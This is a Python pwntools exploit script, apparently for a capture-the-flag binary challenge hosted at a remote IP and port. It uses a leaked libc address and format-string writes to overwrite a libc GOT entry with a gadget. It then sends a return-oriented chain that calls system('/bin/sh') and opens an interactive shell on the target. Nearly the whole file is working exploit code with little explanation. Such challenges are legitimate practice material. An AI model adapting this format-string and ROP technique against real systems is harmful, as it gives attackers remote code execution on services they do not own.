from pwn import *

if args.LOCAL:
    io=process('./chall')
    if args.GDB:
        cmd="""
        init-pwndbg
        b* vuln
        """
        gdb.attach(io, cmd)
    libc=ELF('./libc.so.6')
else:
    io=remote('34.70.212.151', 8008)
    libc=ELF('./libc.so.6')

elf=context.binary=ELF('./chall')
  

def write(byte, add):
    io.sendline(b'2')
    pl = '%{}c%8$hhn'.format(byte).ljust(16,'\0').encode()
    pl+=add
    io.sendline(pl)

def vuln(pl):
    io.sendline(b'2')
    io.sendline(pl)

def another(pl):
    io.sendline(b'3')
    io.sendline(pl)
    
io.sendline(b'1')  
io.recvuntil(b'Have this: ')
og=[0x54ed3, 0x11060a, 0x110612, 0x110617]
libc.address=int(io.recv(14), 16) - 0x81600

addr = 0x1fe170 + libc.address # 0x1fe170 is the got entry of memcpy used almost only in strdup during the whole lifetime of this binary; comment added by breeze
pop_rdi = 0x0000000000028715 + libc.address
pop_chain = 0x0000000000028710 + libc.address # pop r13 ; pop r14 ; pop r15 ; ret
ret = 0x0000000000026a3e + libc.address

 
payload = f"%{0x1000}c%8$hn".ljust(16,'.')
payload = payload.encode() + p64(addr - 1)
vuln(payload)


payload = f"%{(pop_chain//0x100)&0xffff}c%8$hn".ljust(16,'.')
payload = payload.encode() + p64(addr +1)
vuln(payload)
pause()
another(p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system))


io.interactive()